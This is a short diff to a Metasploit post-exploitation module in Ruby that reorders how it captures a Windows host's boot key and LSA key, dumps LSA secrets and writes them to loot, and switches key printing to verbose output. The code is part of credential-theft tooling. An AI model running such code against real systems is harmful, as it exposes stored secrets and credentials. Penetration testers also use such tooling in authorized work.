@@ -269,17 +269,18 @@ class Metasploit3 < Msf::Post
 
   # The sauce starts here
   def run
-    print_status('Obtaining boot key...')
-    bootkey = capture_boot_key
-    #print_status("Boot key: #{bootkey.unpack("H*")[0]}")
-
-    print_status('Obtaining Lsa key...')
-    lsakey = capture_lsa_key(bootkey)
-    #print_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
 
     hostname = session.sys.config.sysinfo['Computer']
     print_status("Executing module against #{hostname}")
-    client.railgun.netapi32()
+
+    print_status('Obtaining boot key...')
+    bootkey = capture_boot_key
+    vprint_status("Boot key: #{bootkey.unpack("H*")[0]}")
+
+    print_status('Obtaining Lsa key...')
+    lsakey = capture_lsa_key(bootkey)
+    vprint_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
+
     begin
       secrets = hostname << get_secret(lsakey)
       print_status("Writing to loot...")
